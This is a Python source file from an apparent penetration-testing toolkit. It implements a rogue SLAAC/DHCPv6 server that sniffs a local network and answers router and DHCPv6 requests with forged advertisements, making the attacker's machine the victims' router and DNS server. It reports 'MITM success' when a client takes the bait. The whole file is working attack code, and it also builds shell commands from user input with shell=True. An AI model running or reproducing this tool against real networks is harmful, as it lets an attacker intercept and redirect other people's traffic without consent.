#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
dhcpv6_rogue_server.py: Rogue SLAAC/DHCPv6 server
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from sys import exit
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW, htons
from random import randint
from typing import Tuple, Any, Union, Dict
from time import sleep
import subprocess as sub
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion


# region Add client info in global clients dictionary
def add_client_info_in_dictionary(client_mac_address: str,
                                  client_info: Dict[str, Union[bool, str]],
                                  this_client_already_in_dictionary: bool = False):
    if this_client_already_in_dictionary:
        clients[client_mac_address].update(client_info)
    else:
        clients[client_mac_address] = client_info
# endregion


# region Send ICMPv6 solicit packets
def send_icmpv6_solicit_packets():
    icmpv6_solicit_raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    icmpv6_solicit_raw_socket.bind((current_network_interface, 0))

    try:
        while True:
            icmpv6_solicit_packet = icmpv6.make_router_solicit_packet(ethernet_src_mac=your_mac_address,
                                                                      ipv6_src=your_local_ipv6_address,
                                                                      need_source_link_layer_address=True,
                                                                      source_link_layer_address=eth.make_random_mac())
            icmpv6_solicit_raw_socket.send(icmpv6_solicit_packet)
            sleep(int(args.delay))

    except KeyboardInterrupt:
        base.print_info('Exit ....')
        icmpv6_solicit_raw_socket.close()
        exit(0)
# endregion


# region Send DHCPv6 solicit packets
def send_dhcpv6_solicit_packets():
    dhcpv6_solicit_raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    dhcpv6_solicit_raw_socket.bind((current_network_interface, 0))

    try:
        while True:
            request_options = [23, 24]
            dhcpv6_solicit_packet = dhcpv6.make_solicit_packet(ethernet_src_mac=your_mac_address,
                                                               ipv6_src=your_local_ipv6_address,
                                                               transaction_id=randint(1, 16777215),
                                                               client_mac_address=eth.make_random_mac(),
                                                               option_request_list=request_options)
            dhcpv6_solicit_raw_socket.send(dhcpv6_solicit_packet)
            sleep(int(args.delay))

    except KeyboardInterrupt:
        base.print_info('Exit ....')
        dhcpv6_solicit_raw_socket.close()
        exit(0)
# endregion


# region Send ICMPv6 advertise packets
def send_icmpv6_advertise_packets():
    icmpv6_advertise_raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    icmpv6_advertise_raw_socket.bind((current_network_interface, 0))

    icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                               ethernet_dst_mac='33:33:00:00:00:01',
                                                               ipv6_src=your_local_ipv6_address,
                                                               ipv6_dst='ff02::1',
                                                               dns_address=recursive_dns_address,
                                                               domain_search=dns_search,
                                                               prefix=network_prefix,
                                                               router_lifetime=5000,
                                                               advertisement_interval=int(args.delay) * 1000)
    try:
        while True:
            icmpv6_advertise_raw_socket.send(icmpv6_ra_packet)
            sleep(int(args.delay))

    except KeyboardInterrupt:
        base.print_info('Exit ....')
        icmpv6_advertise_raw_socket.close()
        exit(0)
# endregion


# region Reply to DHCPv6 and ICMPv6 requests
def reply(request):

    # region Get client MAC address
    client_mac_address: str = request['Ethernet']['source']
    # endregion

    # region Check this client already in global clients dictionary
    client_already_in_dictionary: bool = False
    if client_mac_address in clients.keys():
        client_already_in_dictionary = True
    # endregion

    # region ICMPv6
    if 'ICMPv6' in request.keys():

        # region ICMPv6 Router Solicitation
        if request['ICMPv6']['type'] == 133:

            # Make and send ICMPv6 router advertisement packet
            icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                       ethernet_dst_mac=request['Ethernet']['source'],
                                                                       ipv6_src=your_local_ipv6_address,
                                                                       ipv6_dst=request['IPv6']['source-ip'],
                                                                       dns_address=recursive_dns_address,
                                                                       domain_search=dns_search,
                                                                       prefix=network_prefix,
                                                                       router_lifetime=5000)
            raw_socket.send(icmpv6_ra_packet)

            # Print info messages
            base.print_info('ICMPv6 Router Solicitation request from: ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')')
            base.print_info('ICMPv6 Router Advertisement reply to: ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')')

            # Delete this client from global clients dictionary
            try:
                del clients[client_mac_address]
                client_already_in_dictionary = False
            except KeyError:
                pass

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(
                client_mac_address,
                {'router solicitation': True, 'network prefix': network_prefix},
                client_already_in_dictionary)
        # endregion

        # region ICMPv6 Neighbor Solicitation
        if request['ICMPv6']['type'] == 135:

            # region Get ICMPv6 Neighbor Solicitation target address
            target_address: str = request['ICMPv6']['target-address']
            if target_address.startswith('fe80::'):
                return
            else:
                na_packet: bytes = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                             ipv6_src=your_local_ipv6_address,
                                                                             target_ipv6_address=target_address)
            # endregion

            # region Network prefix in ICMPv6 Neighbor Solicitation target address is bad
            if not target_address.startswith(network_prefix_address):
                for _ in range(5):
                    raw_socket.send(na_packet)
            # endregion

            # region ICMPv6 Neighbor Solicitation target address is your local IPv6 address
            if target_address == your_local_ipv6_address:

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(
                    client_mac_address,
                    {'neighbor solicitation your address': True},
                    client_already_in_dictionary)
            # endregion

            # region DHCPv6 advertise address is set

            # This client already in dictionary
            if client_already_in_dictionary:

                # Advertise address for this client is set
                if 'advertise address' in clients[client_mac_address].keys():

                    # ICMPv6 Neighbor Solicitation target address is DHCPv6 advertise IPv6 address
                    if target_address == clients[client_mac_address]['advertise address']:

                        # Add client info in global clients dictionary
                        add_client_info_in_dictionary(
                            client_mac_address,
                            {'neighbor solicitation advertise address': True},
                            client_already_in_dictionary)

                    # ICMPv6 Neighbor Solicitation target address is not DHCPv6 advertise IPv6 address
                    else:
                        for _ in range(5):
                            raw_socket.send(na_packet)
            # endregion

            # region Print MITM Success message
            if not disable_dhcpv6:
                try:
                    if clients[client_mac_address]['dhcpv6 mitm'] == 'success':
                        test = clients[client_mac_address]['neighbor solicitation advertise address']
                        # test = clients[client_mac_address]['neighbor solicitation your address']

                        try:
                            test = clients[client_mac_address]['success message']
                        except KeyError:
                            base.print_success('MITM success: ', clients[client_mac_address]['advertise address'] +
                                               ' (' + client_mac_address + ')')
                            clients[client_mac_address].update({'success message': True})
                except KeyError:
                    pass
            # endregion

        # endregion

    # endregion

    # region DHCPv6

    # Protocol DHCPv6 is enabled
    if not disable_dhcpv6 and 'DHCPv6' in request.keys():

        # region Get Client identifier and Identity Association for Non-temporary Address
        cid: Union[None, bytes] = None
        iaid: Union[None, int] = None

        for option in request['DHCPv6']['options']:
            if option['type'] == 1:
                cid = option['value']['raw']
            elif option['type'] == 3:
                iaid = option['value']['iaid']

        if cid is None or iaid is None:
            base.print_info('Malformed DHCPv6 packet from: ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')', ' XID: ',
                            hex(request['DHCPv6']['transaction-id']))
            return
        # endregion

        # region DHCPv6 Solicit
        if request['DHCPv6']['message-type'] == 1:

            # Set IPv6 address in advertise packet
            if target['ipv6_address'] is not None:
                ipv6_address = target['ipv6_address']
            else:
                ipv6_address = network_prefix_address + str(randint(first_suffix, last_suffix))

            # Make and send DHCPv6 advertise packet
            dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
                                                            ethernet_dst_mac=request['Ethernet']['source'],
                                                            ipv6_src=your_local_ipv6_address,
                                                            ipv6_dst=request['IPv6']['source-ip'],
                                                            transaction_id=request['DHCPv6']['transaction-id'],
                                                            dns_address=recursive_dns_address,
                                                            domain_search=dns_search,
                                                            ipv6_address=ipv6_address,
                                                            cid=cid, iaid=iaid, preference=255)
            raw_socket.send(dhcpv6_advertise)

            # Print info messages
            base.print_info('DHCPv6 Solicit from: ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')',
                            ' XID: ', hex(request['DHCPv6']['transaction-id']))
            base.print_info('DHCPv6 Advertise to: ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')',
                            ' XID: ', hex(request['DHCPv6']['transaction-id']),
                            ' IAA: ', ipv6_address)

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {'dhcpv6 solicit': True, 'advertise address': ipv6_address},
                                          client_already_in_dictionary)
        # endregion

        # region DHCPv6 Request
        if request['DHCPv6']['message-type'] == 3:

            # Set DHCPv6 reply packet
            dhcpv6_reply: Union[None, bytes] = None

            # region Get Client DUID time, IPv6 address and Server MAC address
            client_ipv6_address: Union[None, str] = None
            server_mac_address: Union[None, str] = None

            for dhcpv6_option in request['DHCPv6']['options']:
                if dhcpv6_option['type'] == 2:
                    server_mac_address = dhcpv6_option['value']['mac-address']
                if dhcpv6_option['type'] == 3:
                    client_ipv6_address = dhcpv6_option['value']['ipv6-address']
            # endregion

            if server_mac_address is not None and client_ipv6_address is not None:

                # Check Server MAC address
                if server_mac_address != your_mac_address:
                    add_client_info_in_dictionary(
                        client_mac_address,
                        {'dhcpv6 mitm': 'error: server mac address is not your mac address'},
                        client_already_in_dictionary)
                else:
                    add_client_info_in_dictionary(
                        client_mac_address,
                        {'dhcpv6 mitm': 'success'},
                        client_already_in_dictionary)
                    try:
                        if client_ipv6_address == clients[client_mac_address]['advertise address']:
                            dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
                                                                    ethernet_dst_mac=request['Ethernet']['source'],
                                                                    ipv6_src=your_local_ipv6_address,
                                                                    ipv6_dst=request['IPv6']['source-ip'],
                                                                    transaction_id=request['DHCPv6']['transaction-id'],
                                                                    dns_address=recursive_dns_address,
                                                                    domain_search=dns_search,
                                                                    ipv6_address=client_ipv6_address,
                                                                    cid=cid)
                            raw_socket.send(dhcpv6_reply)
                        else:
                            add_client_info_in_dictionary(
                                client_mac_address,
                                {'dhcpv6 mitm': 'error: client request address is not advertise address'},
                                client_already_in_dictionary)

                    except KeyError:
                        add_client_info_in_dictionary(
                            client_mac_address,
                            {'dhcpv6 mitm': 'error: not found dhcpv6 solicit request for this client'},
                            client_already_in_dictionary)

                # Print info messages
                base.print_info('DHCPv6 Request from: ', request['IPv6']['source-ip'] +
                                ' (' + request['Ethernet']['source'] + ')',
                                ' XID: ', hex(request['DHCPv6']['transaction-id']),
                                ' Server: ', server_mac_address,
                                ' IAA: ', client_ipv6_address)

                if dhcpv6_reply is not None:
                    base.print_info('DHCPv6 Reply to:     ', request['IPv6']['source-ip'] +
                                    ' (' + request['Ethernet']['source'] + ')',
                                    ' XID: ', hex(request['DHCPv6']['transaction-id']),
                                    ' Server: ', server_mac_address,
                                    ' IAA: ', client_ipv6_address)
                else:
                    if clients[client_mac_address]['dhcpv6 mitm'] == \
                            'error: server mac address is not your mac address':
                        base.print_error('Server MAC address in DHCPv6 Request is not your MAC address ' +
                                         'for this client: ', client_mac_address)

                    if clients[client_mac_address]['dhcpv6 mitm'] == \
                            'error: client request address is not advertise address':
                        base.print_error('Client requested IPv6 address is not advertise IPv6 address ' +
                                         'for this client: ', client_mac_address)

                    if clients[client_mac_address]['dhcpv6 mitm'] == \
                            'error: not found dhcpv6 solicit request for this client':
                        base.print_error('Could not found DHCPv6 solicit request ' +
                                         'for this client: ', client_mac_address)

        # endregion

        # region DHCPv6 Release
        if request['DHCPv6']['message-type'] == 8:
            # Print info message
            base.print_info('DHCPv6 Release from: ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')',
                            ' XID: ', hex(request['DHCPv6']['transaction-id']))

            # Delete this client from global clients dictionary
            try:
                del clients[client_mac_address]
                client_already_in_dictionary = False
            except KeyError:
                pass

        # endregion

        # region DHCPv6 Confirm
        if request['DHCPv6']['message-type'] == 4:

            # region Get Client IPv6 address
            client_ipv6_address: Union[None, str] = None

            for dhcpv6_option in request['DHCPv6']['options']:
                if dhcpv6_option['type'] == 3:
                    client_ipv6_address = dhcpv6_option['value']['ipv6-address']
            # endregion

            # region Make and send DHCPv6 Reply packet
            dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
                                                    ethernet_dst_mac=request['Ethernet']['source'],
                                                    ipv6_src=your_local_ipv6_address,
                                                    ipv6_dst=request['IPv6']['source-ip'],
                                                    transaction_id=request['DHCPv6']['transaction-id'],
                                                    dns_address=recursive_dns_address,
                                                    domain_search=dns_search,
                                                    ipv6_address=client_ipv6_address,
                                                    cid=cid)
            raw_socket.send(dhcpv6_reply)
            # endregion

            # region Add Client info in global clients dictionary and print info message
            add_client_info_in_dictionary(
                client_mac_address,
                {'advertise address': client_ipv6_address, 'dhcpv6 mitm': 'success'},
                client_already_in_dictionary)

            base.print_info('DHCPv6 Confirm from: ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')',
                            ' XID: ', hex(request['DHCPv6']['transaction-id']),
                            ' IAA: ', client_ipv6_address)
            base.print_info('DHCPv6 Reply to:     ', request['IPv6']['source-ip'] +
                            ' (' + request['Ethernet']['source'] + ')',
                            ' XID: ', hex(request['DHCPv6']['transaction-id']),
                            ' IAA: ', client_ipv6_address)
            # endregion

        # endregion

    # endregion

# endregion


# region Main function
if __name__ == '__main__':

    # region Raw-packet modules
    path.append(dirname(dirname(dirname(abspath(__file__)))))
    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawEthernet, RawIPv6, RawICMPv6, RawUDP, RawDHCPv6
    from raw_packet.Utils.tm import ThreadManager

    base: Base = Base()
    eth: RawEthernet = RawEthernet()
    ipv6: RawIPv6 = RawIPv6()
    icmpv6: RawICMPv6 = RawICMPv6()
    udp: RawUDP = RawUDP()
    dhcpv6: RawDHCPv6 = RawDHCPv6()
    # endregion

    # region Set variables
    raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    recursive_dns_address: Union[None, str] = None
    target: Dict[str, Union[None, str]] = {
        'mac_address': None,
        'ipv6_address': None
    }
    first_suffix: Union[None, str] = None
    last_suffix: Union[None, str] = None
    clients: Dict = dict()
    icmpv6_router_solicitation_address: str = '33:33:00:00:00:02'
    dhcpv6_requests_address: str = '33:33:00:01:00:02'
    # endregion
    
    try:
        # region Check user, platform and create threads
        base.check_user()
        base.check_platform()
        tm = ThreadManager(5)
        # endregion
    
        # region Parse script arguments
        parser = ArgumentParser(description='Rogue SLAAC/DHCPv6 server')
    
        parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
        parser.add_argument('-p', '--prefix', type=str, help='Set network prefix', default='fd00::/64')
    
        parser.add_argument('-f', '--first_suffix', type=int, help='Set first suffix client IPv6 for offering',
                            default=2)
        parser.add_argument('-l', '--last_suffix', type=int, help='Set last suffix client IPv6 for offering',
                            default=255)
    
        parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
        parser.add_argument('-T', '--target_ipv6', type=str, help='Set client Global IPv6 address with MAC --target_mac',
                            default=None)
    
        parser.add_argument('-D', '--disable_dhcpv6', action='store_true', help='Do not use DHCPv6 protocol')
        parser.add_argument('-d', '--dns', type=str, help='Set recursive DNS IPv6 address', default=None)
        parser.add_argument('-s', '--dns_search', type=str, help='Set DNS search list', default='local')
        parser.add_argument('--delay', type=int, help='Set delay between packets', default=1)
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
        args = parser.parse_args()
        # endregion
    
        # region Print banner if argument quit is not set
        if not args.quiet:
            base.print_banner()
        # endregion

        # region Disable or Enable DHCPv6 protocol
        disable_dhcpv6 = False
        if args.disable_dhcpv6:
            disable_dhcpv6 = True
        # endregion
    
        # region Get your network settings
        if args.interface is None:
            base.print_warning('Please set a network interface for sniffing ICMPv6 and DHCPv6 requests ...')
        current_network_interface: str = base.network_interface_selection(args.interface)
        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
        your_local_ipv6_address: str = base.get_interface_ipv6_link_address(current_network_interface)
        # endregion
    
        # region Bind raw socket
        raw_socket.bind((current_network_interface, 0))
        # endregion
    
        # region Set search domain and Network prefix
        dns_search = args.dns_search
        network_prefix: str = args.prefix
        network_prefix_address: str = network_prefix.split('/')[0]
        network_prefix_length: str = network_prefix.split('/')[1]
        # endregion
    
        # region Set target MAC and IPv6 address, if target IP is not set - get first and last suffix IPv6 address
    
        # region Set target IPv6 address
        if args.target_mac is not None:
            assert base.mac_address_validation(args.target_mac), \
                'Bad target MAC address: ' + base.error_text(args.target_mac) + \
                ' example: ' + base.info_text('--target_mac 00:AA:BB:CC:DD:FF')
            target['mac_address'] = str(args.target_mac).lower()
        # endregion
    
        # region Target IPv6 is set
        if args.target_ipv6 is not None:
            assert args.target_mac is not None, \
                'Please set target MAC address (example: --target_mac 00:AA:BB:CC:DD:FF) for target IPv6 address: ' + \
                base.info_text(str(args.target_ipv6))
            assert base.ipv6_address_validation(args.target_ipv6), \
                'Bad target IPv6 address in `-T, --target_ipv6` parameter: ' + \
                base.error_text(args.target_ipv6) + ' example: --target_ip ' + base.info_text('fd00::123')
            assert not str(args.target_ipv6).startswith('fe80'), \
                'Bad target IPv6 address in `-T, --target_ipv6` parameter: ' + \
                base.error_text(args.target_ipv6) + ' example: --target_ip ' + base.info_text('fd00::123')
            target['ipv6_address'] = args.target_ipv6
            clients[target['mac_address']] = {'advertise address': target['ipv6_address']}
        # endregion
    
        # region Target IPv6 is not set - get first and last suffix IPv6 address
        else:
            # Check first suffix IPv6 address
            assert 1 < args.first_suffix < 65535, \
                'Bad value `-f, --first_suffix`: ' + base.error_text(str(args.first_suffix)) + \
                ' first suffix IPv6 address must be in range: ' + base.info_text('1 - 65535')
            first_suffix = args.first_suffix

            # Check last suffix IPv6 address
            assert args.last_suffix > first_suffix, \
                'Bad value `-l, --last_suffix`: ' + base.error_text(str(args.last_suffix)) + \
                ' last suffix IPv6 address should be more first suffix IPv6 address: ' + \
                base.info_text(str(first_suffix))
            assert 1 < args.last_suffix < 65535, \
                'Bad value `-l, --last_suffix`: ' + base.error_text(str(args.last_suffix)) + \
                ' last suffix IPv6 address must be in range: ' + base.info_text('1 - 65535')
            last_suffix = args.last_suffix
        # endregion
    
        # endregion
    
        # region Set recursive DNS server address
        if args.dns is None:
            recursive_dns_address = your_local_ipv6_address
        else:
            assert base.ipv6_address_validation(args.dns), \
                'Bad DNS server IPv6 address in `--dns` parameter: ' + base.error_text(args.dns)
            recursive_dns_address = args.dns
        # endregion
    
        # region General output
        if not args.quiet:
            base.print_info('Network interface: ', current_network_interface)
            base.print_info('Your MAC address: ', your_mac_address)
            base.print_info('Your link local IPv6 address: ', your_local_ipv6_address)
    
            if target['mac_address'] is not None:
                base.print_info('Target MAC: ', target['mac_address'])
            if target['ipv6_address'] is not None:
                base.print_info('Target Global IPv6: ', target['ipv6_address'])
            else:
                base.print_info('First suffix offer IP: ', str(first_suffix))
                base.print_info('Last suffix offer IP: ', str(last_suffix))
    
            base.print_info('Prefix: ', network_prefix)
            base.print_info('Router IPv6 address: ', your_local_ipv6_address)
            base.print_info('DNS IPv6 address: ', recursive_dns_address)
            base.print_info('Domain search: ', dns_search)
        # endregion
    
        # region Send ICMPv6 advertise packets in other thread
        tm.add_task(send_icmpv6_advertise_packets)
        # endregion
    
        # region Add multicast MAC addresses on interface
        try:
            base.print_info('Get milticast MAC address on interface: ', current_network_interface)
            mcast_addresses = sub.Popen(['ip maddress show ' + current_network_interface], shell=True, stdout=sub.PIPE)
            out, err = mcast_addresses.communicate()
    
            if icmpv6_router_solicitation_address not in str(out):
                icmpv6_mcast_address = sub.Popen(['ip maddress add ' + icmpv6_router_solicitation_address +
                                                  ' dev ' + current_network_interface], shell=True, stdout=sub.PIPE)
                out, err = icmpv6_mcast_address.communicate()
                if out == '' or out == b'':
                    base.print_info('Add milticast MAC address: ', icmpv6_router_solicitation_address,
                                    ' on interface: ', current_network_interface)
                else:
                    base.print_error('Could not add milticast MAC address: ', icmpv6_router_solicitation_address,
                                     ' on interface: ', current_network_interface)
                    exit(1)
    
            if dhcpv6_requests_address not in str(out):
                dhcp6_mcast_address = sub.Popen(['ip maddress add ' + dhcpv6_requests_address +
                                                 ' dev ' + current_network_interface], shell=True, stdout=sub.PIPE)
                out, err = dhcp6_mcast_address.communicate()
                if out == '' or out == b'':
                    base.print_info('Add milticast MAC address: ', dhcpv6_requests_address,
                                    ' on interface: ', current_network_interface)
                else:
                    base.print_error('Could not add milticast MAC address: ', dhcpv6_requests_address,
                                     ' on interface: ', current_network_interface)
                    exit(1)
    
        except OSError:
            base.print_error('Something went wrong while trying to run ', '`ip`')
            exit(2)
        # endregion
    
        # region Create RAW socket for sniffing
        sniffing_raw_socket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
        # endregion
    
        # region Print info message
        base.print_info('Waiting for a ICMPv6 or DHCPv6 requests ...')
        # endregion
    
        # region Start sniffing
        while True:
            packets: Tuple[bytes, Any] = sniffing_raw_socket.recvfrom(2048)
            for packet in packets:

                # region Try
                try:
                    # region Parse Ethernet header
                    ethernet_header: Union[bytes, Any] = packet[:eth.header_length]
                    ethernet_header_dict: Union[None, Dict[str, Union[int, str]]] = eth.parse_header(ethernet_header)
                    # endregion

                    # region Could not parse Ethernet header - break
                    assert ethernet_header_dict is not None, 'Bad Ethernet packet!'
                    # endregion

                    # region Ethernet filter
                    if target['mac_address'] is not None:
                        assert ethernet_header_dict['source'] == target['mac_address'], \
                            'Ethernet source MAC address is not target MAC address'
                    else:
                        assert ethernet_header_dict['source'] != your_mac_address, \
                            'Ethernet source MAC address is your MAC address'
                    # endregion

                    # region IPv6 packet

                    # 34525 - Type of IP packet (0x86dd)
                    assert ethernet_header_dict['type'] == ipv6.header_type, 'Is not IPv6 packet'

                    # region Parse IPv6 header
                    ipv6_header: Union[bytes, Any] = packet[eth.header_length:eth.header_length + ipv6.header_length]
                    ipv6_header_dict: Union[None, Dict[str, Union[int, str]]] = ipv6.parse_header(ipv6_header)
                    # endregion

                    # region Could not parse IPv6 header - break
                    assert ipv6_header_dict is not None, 'Bad IPv6 packet!'
                    # endregion

                    # region UDP
                    if ipv6_header_dict['next-header'] == udp.header_type:

                        # region Parse UDP header
                        udp_header_offset: int = eth.header_length + ipv6.header_length
                        udp_header: Union[bytes, Any] = packet[udp_header_offset:udp_header_offset + udp.header_length]
                        udp_header_dict: Union[None, Dict[str, Union[int, str]]] = udp.parse_header(udp_header)
                        # endregion

                        # region Could not parse UDP header - break
                        assert udp_header_dict is not None, 'Bad UDP packet!'
                        # endregion

                        # region DHCPv6 packet
                        if udp_header_dict['destination-port'] == 547 and \
                                udp_header_dict['source-port'] == 546:
                            # region Parse DHCPv6 request packet
                            dhcpv6_packet_offset: int = udp_header_offset + udp.header_length
                            dhcpv6_packet: Union[bytes, Any] = packet[dhcpv6_packet_offset:]
                            dhcpv6_packet_dict: Union[None, Dict[str, Union[int, str]]] = dhcpv6.parse_packet(
                                dhcpv6_packet)
                            # endregion

                            # region Could not parse DHCPv6 request packet - break
                            assert dhcpv6_packet_dict is not None, 'Bad DHCPv6 packet!'
                            # endregion

                            # region Call function with full DHCPv6 packet
                            reply({
                                'Ethernet': ethernet_header_dict,
                                'IPv6': ipv6_header_dict,
                                'UDP': udp_header_dict,
                                'DHCPv6': dhcpv6_packet_dict
                            })
                            # endregion

                        # endregion

                    # endregion

                    # region ICMPv6
                    if ipv6_header_dict['next-header'] == icmpv6.packet_type:
                        # region Parse ICMPv6 packet
                        icmpv6_packet_offset: int = eth.header_length + ipv6.header_length
                        icmpv6_packet: Union[bytes, Any] = packet[icmpv6_packet_offset:]
                        icmpv6_packet_dict: Union[None, Dict[str, Union[int, str]]] = icmpv6.parse_packet(icmpv6_packet)
                        # endregion

                        # region Could not parse ICMPv6 packet - break
                        assert icmpv6_packet_dict is not None, 'Bad ICMPv6 packet!'
                        # endregion

                        # region ICMPv6 filter
                        assert icmpv6_packet_dict['type'] != 133 or icmpv6_packet_dict['type'] != 135, \
                            'Bad ICMPv6 packet type!'
                        # endregion

                        # region Call function with full ICMPv6 packet
                        reply({
                            'Ethernet': ethernet_header_dict,
                            'IPv6': ipv6_header_dict,
                            'ICMPv6': icmpv6_packet_dict
                        })
                        # endregion

                    # endregion

                    # endregion

                # endregion

                # region Exception - AssertionError
                except AssertionError:
                    pass
                # endregion
    
        # endregion

    except KeyboardInterrupt:
        base.print_info('Exit ....')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)
        
# endregion
